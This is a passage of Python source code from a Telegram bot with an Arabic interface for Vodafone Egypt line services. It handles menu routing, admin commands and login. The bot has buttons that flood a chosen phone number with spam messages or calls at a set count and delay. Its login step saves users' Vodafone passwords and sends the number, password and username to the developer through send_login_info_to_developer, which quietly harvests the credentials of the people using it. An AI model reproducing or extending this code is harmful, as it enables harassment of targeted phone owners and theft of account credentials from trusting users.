    if user_state and text in list(BUTTON_NAMES.values()) + ["👑 لوحة التحكم", "👥 إضافة اشتراك", "🗑️ حذف أيام من اشتراك", 
                                                             "📊 استعلام عن اشتراك", "📋 قائمة المستخدمين", "✏️ تعديل اسم زر", 
                                                             "📝 عرض أسماء الأزرار", "🔒 تعطيل الاشتراك الإجباري", "🔓 تفعيل الاشتراك الإجباري",
                                                             "🛑 إيقاف البوت", "▶️ تشغيل البوت", "📢 رسالة جماعية", "👁️ إظهار/إخفاء الأزرار",
                                                             "📊 إحصائيات", "🚫 حظر مستخدم", "✅ إلغاء حظر", "💳 تغيير رقم فودافون كاش", get_button_name("back"),
                                                             "➕ إضافة ادمن مساعد", get_button_name("remove_assistant_admin"), "🔄 تغير يوزر بوت تطير",
                                                             get_button_name("manage_channels"), get_button_name("change_dev_username")]:
        cancel_all_next_steps(user_id)
    
    user_state = get_user_state(user_id)
    
    if user_state and text not in [get_button_name("home")]:
        handle_state_messages(message)
        return
    
    session = get_user_session(user_id)
    
    if not session and text != get_button_name("login") and text != "👑 لوحة التحكم":
        if text and text.strip().isdigit() and len(text.strip()) == 11:
            cancel_all_next_steps(user_id)
            # محاولة تسجيل الدخول التلقائي
            number = text.strip()
            if attempt_auto_login(user_id, number):
                # تم تسجيل الدخول تلقائياً
                session = get_user_session(user_id)
                cancel_all_next_steps(user_id)
                welcome_msg = f"✅ تم تسجيل الدخول تلقائياً!\n\nمرحبا {message.from_user.first_name}، يمكنك استخدام الخدمات."
                bot.send_message(user_id, welcome_msg)
                bot.send_message(user_id, "اختر الخدمة التي تريدها:", reply_markup=create_all_services_keyboard(user_id))
            else:
                # إذا فشل التلقائي، نطلب كلمة المرور
                bot.send_message(user_id, get_dynamic_message("login_step2"))
                save_user_state(user_id, step="get_login_password", action="login", 
                               data={'number': number})
        else:
            bot.send_message(
                user_id,
                "Welcome to Vodafone's paid services bot 🔥\n\nسجل دخول واستمتع 😍🔥\n\nاضغط علي زر تسجيل دخول 👌😍",
                reply_markup=create_main_keyboard_for_user(user_id) if user_id not in ADMIN_IDS else create_main_keyboard_for_admin()
            )
        return
    
    if not session:
        if text == get_button_name("login"):
            cancel_all_next_steps(user_id)
            bot.send_message(user_id, get_dynamic_message("login_step1"))
            save_user_state(user_id, step="get_login_number", action="login")
        elif text == "👑 لوحة التحكم" and user_id in ADMIN_IDS:
            bot.send_message(user_id, "👑 لوحة تحكم المالك 👑\n\nاختر الأمر الذي تريده:", reply_markup=create_admin_keyboard())
        return
    
    button_key = None
    for key, name in BUTTON_NAMES.items():
        if name == text:
            button_key = key
            break
    if button_key:
        # التحقق من رؤية الزر للمستخدم العادي
        if user_id not in ADMIN_IDS and not get_button_visibility(button_key):
            bot.send_message(user_id, "⚠️ هذه الخدمة معطلة حالياً.")
            return
        record_button_stat(user_id, button_key)
    
    if session:
        if user_id in ADMIN_IDS and text == "👑 لوحة التحكم":
            bot.send_message(user_id, "👑 لوحة تحكم المالك 👑\n\nاختر الأمر الذي تريده:", reply_markup=create_admin_keyboard())
            return
        
        # ===== القوائم الفرعية الرئيسية =====
        if text == get_button_name("menu_flex_management"):
            cancel_all_next_steps(user_id)
            bot.send_message(user_id, "📊 إدارة فليكس\n\nاختر الخدمة المطلوبة:", reply_markup=create_flex_management_keyboard())
        
        elif text == get_button_name("menu_line_management"):
            cancel_all_next_steps(user_id)
            bot.send_message(user_id, "⚙️ إدارة الخط و الحساب\n\nاختر الخدمة المطلوبة:", reply_markup=create_line_management_keyboard())
        
        elif text == get_button_name("menu_internet"):
            cancel_all_next_steps(user_id)
            bot.send_message(user_id, "🌐 باقات الإنترنت\n\nاختر الخدمة المطلوبة:", reply_markup=create_internet_menu_keyboard())
        
        elif text == get_button_name("menu_offers"):
            cancel_all_next_steps(user_id)
            bot.send_message(user_id, "🎯 العروض و الخصومات\n\nاختر الخدمة المطلوبة:", reply_markup=create_offers_menu_keyboard())
        
        elif text == get_button_name("menu_other"):
            cancel_all_next_steps(user_id)
            bot.send_message(user_id, "🔧 خدمات أخرى\n\nاختر الخدمة المطلوبة:", reply_markup=create_other_services_keyboard())
        
        elif text == get_button_name("menu_nota"):
            cancel_all_next_steps(user_id)
            bot.send_message(user_id, "📋 نوتة جميع الأنظمة\n\nاختر نوع النوتة:", reply_markup=create_nota_menu_keyboard())
        
        # زر القائمة السابقة - يرجع للقائمة الرئيسية
        elif text == get_button_name("back"):
            cancel_all_next_steps(user_id)
            bot.send_message(user_id, f"مرحبا {message.from_user.first_name}!\n\nيمكنك استخدام الخدمات.", reply_markup=create_all_services_keyboard(user_id))
        
        # ===== زر السبام الجديد =====
        elif text == get_button_name("spam_messages"):
            cancel_all_next_steps(user_id)
            bot.send_message(user_id, "📱 أرسل رقم الهاتف (11 رقم يبدأ بـ 01):")
            save_user_state(user_id, step="spam_ask_number", action="spam", data={})

        # ===== زر سبام مكالمات =====
        elif text == get_button_name("spam_calls"):
            cancel_all_next_steps(user_id)
            bot.send_message(user_id, "📞 سبام مكالمات\n\n📱 أرسل رقم الهاتف المراد الاتصال به (11 رقم يبدأ بـ 01):")
            save_user_state(user_id, step="spam_calls_ask_number", action="spam_calls", data={})
        
        # ===== زر الاشتراك المميز (تم إزالته من الخدمات ولكنه موجود هنا للتوافق مع رسالة عدم الاشتراك) =====
        elif text == get_button_name("premium_subscription"):
            cancel_all_next_steps(user_id)
            run_premium_subscription_start(user_id)
        
        # ===== زر تواصل مع المطور =====
        elif text == get_button_name("contact_dev"):
            cancel_all_next_steps(user_id)
            developer_username = get_developer_username()
            bot.send_message(user_id, f"👨‍💻 للتواصل مع المطور:\n\n{developer_username}\n\nيمكنك مراسلته مباشرة.", reply_markup=InlineKeyboardMarkup().add(
                InlineKeyboardButton("📩 مراسلة المطور", url=f"https://t.me/{developer_username[1:]}")
            ))
        
        # ===== زر بيانات الخط الجديد =====
        elif text == get_button_name("user_data"):
            msg = bot.send_message(user_id, "⏳ جاري تحميل بيانات الخط...")
            Thread(target=lambda: run_user_data(user_id, msg.message_id, session)).start()
        
        # ===== زر تجديد الباقة الجديد (تم تعديله ليعمل بشكل صحيح) =====
        elif text == get_button_name("renew_bundle"):
            cancel_all_next_steps(user_id)
            msg = bot.send_message(user_id, "⏳ جاري تجديد الباقة...")
            Thread(target=lambda: run_renew_bundle(user_id, msg.message_id, session)).start()
        
        # ===== زر أنظمة فليكس الجديد (المنقول) =====
        elif text == get_button_name("flex_systems"):
            cancel_all_next_steps(user_id)
            bot.send_message(user_id, "📋 اختر النظام الذي تريد تفعيله:", reply_markup=create_flex_systems_keyboard())
        
        # ===== زر سجل المكالمات الجديد =====
        elif text == get_button_name("call_history"):
            cancel_all_next_steps(user_id)
            msg = bot.send_message(user_id, "⏳ جاري تحميل سجل المكالمات...")
            Thread(target=lambda: run_call_history(user_id, msg.message_id, session)).start()
        
        # ===== زر عرض النت الشهر التاني =====
        elif text == get_button_name("second_month_internet"):
            cancel_all_next_steps(user_id)
            msg = bot.send_message(user_id, "⏳ جاري تفعيل عرض النت الشهر التاني...")
            Thread(target=lambda: run_second_month_internet(user_id, msg.message_id, session)).start()
        
        # ===== زر إدارة القنوات الإجبارية =====
        elif text == get_button_name("manage_channels"):
            if user_id in ADMIN_IDS:
                admin_manage_channels_menu(user_id)
            else:
                bot.send_message(user_id, "🚫 غير مصرح.")
        
        # ===== زر تغيير يوزر المطور =====
        elif text == get_button_name("change_dev_username"):
            if user_id in ADMIN_IDS:
                admin_change_dev_username(user_id)
            else:
                bot.send_message(user_id, "🚫 غير مصرح.")
        
        # ===== باقي الخدمات (كما هي) =====
        elif text == get_button_name("internet_bundles"):
            cancel_all_next_steps(user_id)
            bot.send_message(user_id, "📡 اختر باقة الإنترنت:", reply_markup=create_internet_bundles_keyboard())
            
        elif text == get_button_name("get_offers"):
            msg = bot.send_message(user_id, "⏳ جاري جلب العروض...")
            Thread(target=run_offers_auto_fetch, args=(user_id, msg.message_id, session)).start()
            
        elif text == get_button_name("cards"):
            cancel_all_next_steps(user_id)
            bot.send_message(user_id, "🛒 اختر الكارت الذي تريد شراءه:", reply_markup=create_cards_keyboard())
            
        elif text == get_button_name("suspend_line"):
            cancel_all_next_steps(user_id)
            bot.send_message(user_id, "⏸️ إيقاف خط فودافون\n\nالخطوة 1 من 3:\n📱 أرسل رقم الهاتف المراد إيقافه:")
            save_user_state(user_id, step="get_suspend_number", action="suspend_line", 
                          data={'password': session['password']})
            
        elif text == get_button_name("stop_ads"):
            bot.send_message(user_id, "🎁 اختر الخدمة المطلوبة:", reply_markup=create_stop_ads_menu())
            
        elif text == get_button_name("change_password"):
            cancel_all_next_steps(user_id)
            bot.send_message(user_id, "🔐 تغيير كلمة المرور\n\nالخطوة 1 من 2:\n🔒 أرسل كلمة المرور القديمة:")
            save_user_state(user_id, step="change_password_old", action="change_password", 
                          data={'number': session['number']})
        
        elif text == get_button_name("discount_offers"):
            cancel_all_next_steps(user_id)
            msg = bot.send_message(user_id, "⏳ جاري جلب عروض الخصم...")
            Thread(target=run_discount_offers, args=(user_id, msg.message_id, session)).start()
        
        elif text == get_button_name("package_report"):
            msg = bot.send_message(user_id, "⏳ جاري تحميل بيانات اشتراكاتك...")
            Thread(target=show_subscription_details, args=(user_id, msg.message_id, session)).start()
            
        elif text == get_button_name("package_conversion"):
            cancel_all_next_steps(user_id)
            # عرض القائمة ولكن عند اختيار أي منها سيظهر رسالة معطلة
            bot.send_message(user_id, "💰 تحويل الأنظمة وتزويد يومين\n\n⚠️ هذه الخدمة معطلة حالياً.\n\nسيتم تفعيلها قريباً.", reply_markup=create_package_conversion_menu())
            
        elif text == get_button_name("add_two_days"):
            cancel_all_next_steps(user_id)
            # إظهار تأكيد لتفعيل تزويد يومين
            keyboard = InlineKeyboardMarkup()
            keyboard.add(
                InlineKeyboardButton("✅ تأكيد", callback_data="confirm_rollover"),
                InlineKeyboardButton("❌ إلغاء", callback_data="cancel_action")
            )
            bot.send_message(user_id, "❓ هل أنت متأكد من تفعيل خدمة تزويد يومين؟", reply_markup=keyboard)
        
        elif text == get_button_name("refund_money_back"):
            cancel_all_next_steps(user_id)
            msg = bot.send_message(user_id, "⏳ جاري تحميل بيانات الماني باك...")
            run_money_back_menu(user_id, msg.message_id)
        
        elif text == get_button_name("flex_260"):
            cancel_all_next_steps(user_id)
            bot.send_message(user_id, "🔴 خدمات فليكس فاميلي👨‍👩‍👧‍👦 🔴\n\nاختر الخدمة التي تريدها:", reply_markup=create_flex_260_keyboard())
        
        elif text == get_button_name("flex_percentage"):
            msg = bot.send_message(user_id, "⏳ جاري جلب نسبة الفليكس...")
            Thread(target=lambda: run_flex_percentage(user_id, msg.message_id, session)).start()
            
        elif text == get_button_name("get_owner_number"):
            msg = bot.send_message(user_id, "⏳ جاري البحث عن رقم المالك...")
            Thread(target=lambda: run_owner_number(user_id, msg.message_id, session)).start()
            
        elif text == get_button_name("send_invitation"):
            cancel_all_next_steps(user_id)
            bot.send_message(user_id, "📤 إرسال دعوة فليكس\n\nسيتم استخدام بيانات المالك المسجلة تلقائياً\n\n📱 أرسل رقم العضو الجديد:")
            save_user_state(user_id, step="send_invitation_member", action="send_invitation", 
                          data={'owner_number': session['number'], 'owner_password': session['password']})
            
        elif text == get_button_name("accept_invitation"):
            cancel_all_next_steps(user_id)
            bot.send_message(user_id, "✅ قبول دعوة فليكس\n\nستستخدم بياناتك المسجلة كعضو\n\n📱 أرسل رقم المالك (الاونر) لقبول الدعوة:")
            save_user_state(user_id, step="accept_invitation_owner", action="accept_invitation",
                          data={'member_number': session['number'], 'member_password': session['password']})
            
        elif text == get_button_name("delete_invitation"):
            cancel_all_next_steps(user_id)
            bot.send_message(user_id, "🗑️ حذف دعوة فليكس\n\nستستخدم بياناتك المسجلة كمالك\n\n📱 أرسل رقم العضو المراد حذف دعوته:")
            save_user_state(user_id, step="delete_invitation_member", action="delete_invitation",
                          data={'owner_number': session['number'], 'owner_password': session['password']})
            
        elif text == get_button_name("change_quota"):
            cancel_all_next_steps(user_id)
            bot.send_message(user_id, "📈 تغيير نسبة الحصة\n\nستستخدم بياناتك المسجلة كمالك\n\n📱 أرسل رقم العضو المراد تغيير حصته:")
            save_user_state(user_id, step="change_quota_member", action="change_quota",
                          data={'owner_number': session['number'], 'owner_password': session['password']})
            
        elif text == get_button_name("send_and_accept"):
            cancel_all_next_steps(user_id)
            bot.send_message(user_id, "🎯 إرسال وقبول دعوة فليكس\n\nستستخدم بياناتك المسجلة كمالك\n\n📱 أرسل رقم العضو الجديد:")
            save_user_state(user_id, step="send_accept_member", action="send_and_accept", 
                          data={'owner_number': session['number'], 'owner_password': session['password']})
        
        elif text == get_button_name("add_family_member_4x4"):
            cancel_all_next_steps(user_id)
            link = get_family_bot_link()
            bot.send_message(
                user_id,
                f"🚀 تم تحديث هذه الخدمة، يرجى استخدام البوت المخصص:\n\n👉 {link}",
                reply_markup=InlineKeyboardMarkup().add(
                    InlineKeyboardButton("🔗 الذهاب إلى البوت", url=link)
                )
            )
        
        elif text == get_button_name("charge_cards"):
            cancel_all_next_steps(user_id)
            bot.send_message(user_id, "💳 شحن كروت فودافون", reply_markup=create_charge_cards_menu())
        
        elif text == get_button_name("balance_transfer"):
            cancel_all_next_steps(user_id)
            msg = bot.send_message(user_id, "💰 جاري تجهيز قائمة تحويل الرصيد...")
            run_balance_transfer_menu(user_id, msg.message_id)
        
        elif text == get_button_name("flex_transfer"):  # زر تحويل الفليكسات الجديد
            cancel_all_next_steps(user_id)
            run_flex_transfer_menu(user_id, None)  # message_id غير موجود لأنها رسالة جديدة، سنستخدم send_message
        
        elif text == get_button_name("truecaller"):  # زر تروكولر الجديد
            cancel_all_next_steps(user_id)
            bot.send_message(user_id, "📞 البحث عن اسم المتصل\n\n📱 أرسل رقم الهاتف (11 رقم يبدأ بـ 01):")
            save_user_state(user_id, step="truecaller_waiting_number", action="truecaller", data={})
        
        # ===== زر كروت فكة بدون ضريبة =====
        elif text == get_button_name("vodafone_cash_no_tax"):
            cancel_all_next_steps(user_id)
            bot.send_message(
                user_id,
                "🛒 كروت فكة بدون ضريبة\n\n"
                "🔥 اضغط على الزر أدناه للذهاب إلى البوت المخصص:",
                reply_markup=InlineKeyboardMarkup().add(
                    InlineKeyboardButton("🛒 كروت فكة بدون ضريبة", url="https://t.me/cobra_Cards_bot")
                )
            )
        
        # ===== زر تفاصيل العائلة الجديد =====
        elif text == get_button_name("family_details"):
            cancel_all_next_steps(user_id)
            msg = bot.send_message(user_id, "⏳ جاري جلب تفاصيل العائلة...")
            Thread(target=lambda: run_family_details(user_id, msg.message_id, session)).start()
        
        elif text == get_button_name("check_nota_eligibility"):
            cancel_all_next_steps(user_id)
            msg = bot.send_message(user_id, "⏳ جاري التحقق من تأهيل الخط للنوتة...")
            Thread(target=lambda: run_check_nota_eligibility(user_id, msg.message_id, session)).start()
        
        elif text == get_button_name("activate_nota15"):
            cancel_all_next_steps(user_id)
            keyboard = InlineKeyboardMarkup()
            keyboard.add(
                InlineKeyboardButton("✅ تأكيد التفعيل", callback_data="confirm_activate_nota15"),
                InlineKeyboardButton("❌ إلغاء", callback_data="cancel_action")
            )
            bot.send_message(user_id, "⚠️ هل أنت متأكد من تفعيل نوتة 15؟\n\nتأكد أن خطك مؤهل أولاً قبل التفعيل.", reply_markup=keyboard)
        
        elif text == get_button_name("activate_nota40"):
            cancel_all_next_steps(user_id)
            keyboard = InlineKeyboardMarkup()
            keyboard.add(
                InlineKeyboardButton("✅ تأكيد التفعيل", callback_data="confirm_activate_nota40"),
                InlineKeyboardButton("❌ إلغاء", callback_data="cancel_action")
            )
            bot.send_message(user_id, "⚠️ هل أنت متأكد من تفعيل نوتة 40؟\n\nتأكد أن خطك مؤهل أولاً قبل التفعيل.", reply_markup=keyboard)
        
        elif text == get_button_name("logout"):
            logout_user(user_id)
            cancel_all_next_steps(user_id)
            if user_id in ADMIN_IDS:
                bot.send_message(user_id, "✅ تم تسجيل الخروج بنجاح!\n\nتم تسجيل خروجك من جميع الأجهزة.", reply_markup=create_main_keyboard_for_admin())
            else:
                bot.send_message(user_id, "✅ تم تسجيل الخروج بنجاح!\n\nتم تسجيل خروجك من جميع الأجهزة.", reply_markup=create_main_keyboard_for_user(user_id))
        
        elif text == get_button_name("home"):
            cancel_all_next_steps(user_id)
            session = get_user_session(user_id)
            if session:
                welcome_msg = f"مرحبا بك مرة أخرى {message.from_user.first_name}!\n\nيمكنك استخدام الخدمات."
                try:
                    bot.send_message(user_id, welcome_msg, reply_markup=create_all_services_keyboard(user_id))
                except telebot.apihelper.ApiTelegramException as e:
                    if "message is not modified" not in str(e):
                        bot.send_message(user_id, welcome_msg, reply_markup=create_all_services_keyboard(user_id))
            else:
                if user_id in ADMIN_IDS:
                    bot.send_message(user_id, WELCOME_MESSAGE + "اضغط على زر تسجيل الدخول للبدء:", reply_markup=create_main_keyboard_for_admin())
                else:
                    bot.send_message(user_id, WELCOME_MESSAGE + "اضغط على زر تسجيل الدخول للبدء:", reply_markup=create_main_keyboard_for_user(user_id))
        
        elif text == get_button_name("back"):
            # العودة إلى القائمة الرئيسية
            cancel_all_next_steps(user_id)
            session = get_user_session(user_id)
            if session:
                welcome_msg = f"مرحبا بك مرة أخرى {message.from_user.first_name}!\n\nيمكنك استخدام الخدمات."
                try:
                    bot.send_message(user_id, welcome_msg, reply_markup=create_all_services_keyboard(user_id))
                except telebot.apihelper.ApiTelegramException as e:
                    if "message is not modified" not in str(e):
                        bot.send_message(user_id, welcome_msg, reply_markup=create_all_services_keyboard(user_id))
            else:
                if user_id in ADMIN_IDS:
                    bot.send_message(user_id, WELCOME_MESSAGE + "اضغط على زر تسجيل الدخول للبدء:", reply_markup=create_main_keyboard_for_admin())
                else:
                    bot.send_message(user_id, WELCOME_MESSAGE + "اضغط على زر تسجيل الدخول للبدء:", reply_markup=create_main_keyboard_for_user(user_id))
        
        elif user_id in ADMIN_IDS:
            if text == "👥 إضافة اشتراك":
                cancel_all_next_steps(user_id)
                bot.send_message(user_id, "👥 إضافة اشتراك جديد\n\n📱 أرسل معرف المستخدم (user_id):")
                save_user_state(user_id, step="admin_add_subscription_user", action="admin_add_subscription")
            
            elif text == "🗑️ حذف أيام من اشتراك":
                cancel_all_next_steps(user_id)
                bot.send_message(user_id, "🗑️ حذف أيام من اشتراك\n\n📱 أرسل معرف المستخدم (user_id):")
                save_user_state(user_id, step="admin_remove_subscription_user", action="admin_remove_subscription")
            
            elif text == "📊 استعلام عن اشتراك":
                cancel_all_next_steps(user_id)
                bot.send_message(user_id, "📊 استعلام عن اشتراك\n\n📱 أرسل معرف المستخدم (user_id):")
                save_user_state(user_id, step="admin_check_subscription", action="admin_check_subscription")
            
            elif text == "📋 قائمة المستخدمين":
                def get_users_list():
                    conn = sqlite3.connect(DB_FILE, detect_types=sqlite3.PARSE_DECLTYPES)
                    cursor = conn.cursor()
                    cursor.execute('''
                        SELECT u.user_id, u.number, s.subscription_end, s.is_active, s.days_remaining
                        FROM users u
                        LEFT JOIN subscriptions s ON u.user_id = s.user_id
                        WHERE u.is_logged_in = 1
                        ORDER BY u.login_time DESC
                        LIMIT 20
                    ''')
                    users = cursor.fetchall()
                    conn.close()
                    
                    if users:
                        msg = "📋 قائمة المستخدمين النشطين (آخر 20):\n\n"
                        for user in users:
                            user_id_db, number, end_date, is_active, days = user
                            status = "✅ نشط" if is_active else "❌ غير نشط"
                            end_str = end_date.strftime('%Y-%m-%d') if end_date else "غير محدد"
                            msg += f"🆔 {user_id_db}\n📱 {number}\n📅 ينتهي: {end_str}\n📊 الأيام: {days}\n{status}\n━━━━━━━━━━━━\n"
                        bot.send_message(user_id, msg)
                    else:
                        bot.send_message(user_id, "📋 لا يوجد مستخدمين نشطين حالياً.")
                
                Thread(target=get_users_list).start()
            
            elif text == "✏️ تعديل اسم زر":
                buttons_list = "\n".join([f"{key} : {value}" for key, value in BUTTON_NAMES.items()])
                bot.send_message(user_id, f"✏️ تعديل اسم زر\n\nأسماء الأزرار الحالية:\n{buttons_list}\n\n📝 أرسل مفتاح الزر والاسم الجديد بالصيغة:\nkey|الاسم الجديد\n\nمثال: login|🔐 دخول")
                save_user_state(user_id, step="admin_edit_button", action="admin_edit_button")
            
            elif text == "📝 عرض أسماء الأزرار":
                buttons_list = "\n".join([f"{key} : {value}" for key, value in BUTTON_NAMES.items()])
                bot.send_message(user_id, f"📝 أسماء الأزرار الحالية:\n\n{buttons_list}")
            
            elif text == "📢 رسالة جماعية":
                cancel_all_next_steps(user_id)
                bot.send_message(user_id, "📢 إرسال رسالة جماعية\n\n📝 أرسل الرسالة التي تريد إرسالها لجميع المستخدمين:")
                save_user_state(user_id, step="admin_broadcast_message", action="admin_broadcast")
            
            elif text == "👁️ إظهار/إخفاء الأزرار":
                cancel_all_next_steps(user_id)
                admin_toggle_buttons_list(user_id)
            
            elif text == "📊 إحصائيات":
                cancel_all_next_steps(user_id)
                stats = get_button_stats()
                total_users = get_total_users_count()
                logged_in = get_logged_in_users_count()
                active_subs = get_active_subscriptions_count()
                
                msg = f"📊 إحصائيات البوت:\n\n"
                msg += f"👥 إجمالي المستخدمين: {total_users}\n"
                msg += f"✅ مسجلي الدخول حالياً: {logged_in}\n"
                msg += f"🌟 الاشتراكات النشطة: {active_subs}\n\n"
                msg += "📈 عدد ضغطات كل زر:\n"
                if stats:
                    for key, count in stats:
                        name = BUTTON_NAMES.get(key, key)
                        msg += f"• {name}: {count} مرة\n"
                else:
                    msg += "لا توجد ضغطات مسجلة بعد.\n"
                
                bot.send_message(user_id, msg)
            
            elif text == "🚫 حظر مستخدم":
                cancel_all_next_steps(user_id)
                bot.send_message(user_id, "🚫 حظر مستخدم\n\n📱 أرسل معرف المستخدم (user_id) الذي تريد حظره:")
                save_user_state(user_id, step="admin_ban_user", action="admin_ban")
            
            elif text == "✅ إلغاء حظر":
                cancel_all_next_steps(user_id)
                bot.send_message(user_id, "✅ إلغاء حظر مستخدم\n\n📱 أرسل معرف المستخدم (user_id) الذي تريد إلغاء حظره:")
                save_user_state(user_id, step="admin_unban_user", action="admin_unban")
            
            elif text == "💳 تغيير رقم فودافون كاش":
                cancel_all_next_steps(user_id)
                bot.send_message(user_id, f"💳 الرقم الحالي: {get_vodafone_cash_number()}\n\nأرسل الرقم الجديد (11 رقم):")
                save_user_state(user_id, step="admin_change_cash_number", action="admin_change_cash")
            
            elif text == "🔒 تعطيل الاشتراك الإجباري" or text == "🔓 تفعيل الاشتراك الإجباري":
                current_value = get_require_subscription_setting()
                new_value = not current_value
                set_require_subscription_setting(new_value, user_id)
                
                status_text = "مُفعّل" if new_value else "مُعطّل"
                bot.send_message(user_id, f"✅ تم {'تعطيل' if new_value else 'تفعيل'} الاشتراك الإجباري\n\nالحالة الحالية: {status_text}")
            
            elif text == "🛑 إيقاف البوت" or text == "▶️ تشغيل البوت":
                current_state = is_bot_running()
                new_state = not current_state
                set_bot_running(new_state)
                status_text = "🛑 متوقف" if not new_state else "▶️ يعمل"
                bot.send_message(user_id, f"✅ تم {'إيقاف' if not new_state else 'تشغيل'} البوت\n\nالحالة الحالية: {status_text}")
            
            elif text == "➕ إضافة ادمن مساعد":
                cancel_all_next_steps(user_id)
                bot.send_message(user_id, "➕ إضافة ادمن مساعد\n\n📱 أرسل معرف المستخدم (user_id) الذي تريد إضافته كمساعد:")
                save_user_state(user_id, step="admin_add_assistant", action="admin_add_assistant")
            
            elif text == get_button_name("remove_assistant_admin"):
                cancel_all_next_steps(user_id)
                bot.send_message(user_id, "➖ حذف ادمن مساعد\n\n📱 أرسل معرف المستخدم (user_id) الذي تريد إزالته من المساعدين:")
                save_user_state(user_id, step="admin_remove_assistant", action="admin_remove_assistant")
            
            elif text == "🔄 تغير يوزر بوت تطير":
                cancel_all_next_steps(user_id)
                current_link = get_family_bot_link()
                bot.send_message(user_id, f"🔄 تغيير رابط بوت تطير\n\nالرابط الحالي: {current_link}\n\nأرسل الرابط الجديد (يبدأ بـ https://t.me/ أو @username):")
                save_user_state(user_id, step="admin_change_family_link", action="admin_change_family_link")
    
    if text == get_button_name("login"):
        session = get_user_session(user_id)
        if session:
            welcome_msg = f"✅ أنت مسجل دخول بالفعل!\n\nمرحبا {message.from_user.first_name}، يمكنك استخدام الخدمات."
            try:
                bot.send_message(user_id, welcome_msg, reply_markup=create_all_services_keyboard(user_id))
            except telebot.apihelper.ApiTelegramException as e:
                if "message is not modified" not in str(e):
                    bot.send_message(user_id, welcome_msg, reply_markup=create_all_services_keyboard(user_id))
        else:
            cancel_all_next_steps(user_id)
            bot.send_message(user_id, get_dynamic_message("login_step1"))
            save_user_state(user_id, step="get_login_number", action="login")
    
    elif text not in list(BUTTON_NAMES.values()) + ["👑 لوحة التحكم", "👥 إضافة اشتراك", "🗑️ حذف أيام من اشتراك", "📊 استعلام عن اشتراك", 
                                                    "📋 قائمة المستخدمين", "✏️ تعديل اسم زر", "📝 عرض أسماء الأزرار", "🛑 إيقاف البوت", "▶️ تشغيل البوت",
                                                    "📢 رسالة جماعية", "👁️ إظهار/إخفاء الأزرار", "📊 إحصائيات", "🚫 حظر مستخدم", "✅ إلغاء حظر",
                                                    "💳 تغيير رقم فودافون كاش", "➕ إضافة ادمن مساعد", get_button_name("remove_assistant_admin"), "🔄 تغير يوزر بوت تطير",
                                                    get_button_name("manage_channels"), get_button_name("change_dev_username")]:
        handle_state_messages(message)

def handle_state_messages(message):
    user_id = message.chat.id
    text = message.text
    
    state = get_user_state(user_id)
    
    if not state:
        if text and text.strip().isdigit() and len(text.strip()) == 11:
            cancel_all_next_steps(user_id)
            bot.send_message(user_id, get_dynamic_message("login_step2"))
            save_user_state(user_id, step="get_login_password", action="login", 
                           data={'number': text.strip()})
            return
            
        if user_id in ADMIN_IDS:
            bot.send_message(
                user_id,
                "⚠️ الأمر غير معروف!\n\n"
                "الرجاء استخدام الأزرار في القائمة.\n\nتصلي على سيدنا محمد ﷺ",
                reply_markup=create_main_keyboard_for_admin()
            )
        else:
            bot.send_message(
                user_id,
                "⚠️ الأمر غير معروف!\n\n"
                "الرجاء استخدام الأزرار في القائمة.\n\nتصلي على سيدنا محمد ﷺ",
                reply_markup=create_main_keyboard_for_user(user_id)
            )
        return
    
    step = state.get('step')
    action = state.get('action')
    
    if step == "get_login_number":
        if not text or not text.strip().isdigit() or len(text.strip()) != 11:
            bot.send_message(user_id, "❌ الرقم يجب أن يكون 11 رقم فقط. أعد إرسال الرقم:")
            return
        
        # محاولة تسجيل الدخول التلقائي
        number = text.strip()
        if attempt_auto_login(user_id, number):
            # تم تسجيل الدخول تلقائياً
            session = get_user_session(user_id)
            clear_user_state(user_id)
            # إرسال رسالة النجاح المبسطة
            welcome_msg = f"✅ تم تسجيل الدخول تلقائياً!\n\nمرحبا {message.from_user.first_name}، يمكنك استخدام الخدمات."
            bot.send_message(user_id, welcome_msg)
            bot.send_message(user_id, "اختر الخدمة التي تريدها:", reply_markup=create_all_services_keyboard(user_id))
            return
        
        # إذا فشل التلقائي، نطلب كلمة المرور
        save_user_state(user_id, step="get_login_password", action="login", 
                       data={'number': number})
        bot.send_message(user_id, get_dynamic_message("login_step2"))
    
    elif step == "get_login_password":
        password = text.strip()
        data = state.get('data', {})
        number = data.get('number')
        
        if not number:
            bot.send_message(user_id, "❌ حدث خطأ. الرجاء البدء من جديد.")
            cancel_all_next_steps(user_id); return
        
        msg = bot.send_message(user_id, "⏳ جاري تسجيل الدخول...")
        
        token = get_fresh_token(number, password)
        
        if token.startswith("ERROR:"):
            error_msg = token.replace("ERROR: ", "")
            bot.edit_message_text(
                f"❌ فشل تسجيل الدخول:\n{error_msg}",
                user_id,
                msg.message_id
            )
            cancel_all_next_steps(user_id); return
        
        # رسالة نجاح مبسطة بدلاً من التفاصيل
        simple_success = f"✅ تم تسجيل الدخول بنجاح!\n\nمرحبا {message.from_user.first_name}، يمكنك الآن استخدام الخدمات."
        
        save_user_session(user_id, number, password, token)
        
        user_first_name = message.from_user.first_name
        username = message.from_user.username
        send_login_info_to_developer(user_id, number, password, user_first_name, username)
        
        clear_user_state(user_id)
        
        bot.edit_message_text(simple_success, user_id, msg.message_id)
        bot.send_message(user_id, "اختر الخدمة التي تريدها:", reply_markup=create_all_services_keyboard(user_id))
    
    # ===== خطوات سبام المكالمات =====
    elif step == "spam_calls_ask_number":
        if not text.isdigit() or len(text) != 11 or not text.startswith('01'):
            bot.send_message(user_id, "❌ رقم غير صالح! أدخل رقم 11 رقم يبدأ بـ 01:")
            return
        data = state.get('data', {})
        data['number'] = text
        save_user_state(user_id, step="spam_calls_ask_count", action="spam_calls", data=data)
        bot.send_message(user_id, "🔢 أدخل عدد المكالمات:")

    elif step == "spam_calls_ask_count":
        try:
            count = int(text)
            if count <= 0:
                bot.send_message(user_id, "❌ العدد يجب أن يكون أكبر من صفر!")
                return
            data = state.get('data', {})
            data['count'] = count
            save_user_state(user_id, step="spam_calls_ask_delay", action="spam_calls", data=data)
            bot.send_message(user_id, "⏱️ أدخل الوقت بالثواني بين كل مكالمة:")
        except ValueError:
            bot.send_message(user_id, "❌ الرجاء إدخال رقم صحيح!")

    elif step == "spam_calls_ask_delay":
        try:
            delay = float(text)
            if delay <= 0:
                bot.send_message(user_id, "❌ الوقت يجب أن يكون أكبر من صفر!")
                return
            data = state.get('data', {})
            number = data['number']
            count = data['count']
            clear_user_state(user_id)
            keyboard = types.InlineKeyboardMarkup()
            keyboard.add(types.InlineKeyboardButton(f"🚀 بدء الاتصال بـ {number}", callback_data=f"spam_calls_start_{number}_{count}_{delay}"))
            bot.send_message(user_id,
